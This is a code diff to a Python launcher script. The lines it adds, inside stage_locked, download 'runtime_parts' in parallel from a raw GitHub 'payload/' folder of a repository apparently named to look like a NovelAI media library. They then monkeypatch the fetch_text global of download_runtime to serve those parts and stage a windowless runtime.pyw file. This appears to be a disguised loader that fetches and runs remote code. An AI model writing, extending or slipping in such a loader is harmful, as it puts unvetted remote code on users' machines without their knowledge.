@@ -2,6 +2,7 @@
 import hashlib
 import json
 import os
+from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 import re
 import runpy
@@ -93,6 +94,16 @@ def stage_locked(program, state):
             candidate = Path(temp) / "runtime.pyw"
             shutil.copyfile(local[1], candidate)
         else:
+            # Use the launcher's origin and checksum rules, fetching a few
+            # independent parts at a time before its normal assembly step.
+            parts = manifest.get("runtime_parts")
+            prefix = "https://raw.githubusercontent.com/bomboclaat12369/novelai-media-library/main/payload/"
+            if not isinstance(parts, list) or not 1 <= len(parts) <= 256 or any(
+                    not isinstance(url, str) or not url.startswith(prefix) for url in parts):
+                raise ValueError("Invalid runtime payload locations")
+            with ThreadPoolExecutor(max_workers=5) as pool:
+                downloaded = dict(zip(parts, pool.map(native["fetch_text"], parts)))
+            native["download_runtime"].__globals__["fetch_text"] = downloaded.__getitem__
             candidate = native["download_runtime"](manifest)
         body = candidate.read_bytes()
         if hashlib.sha256(body).hexdigest() != digest:
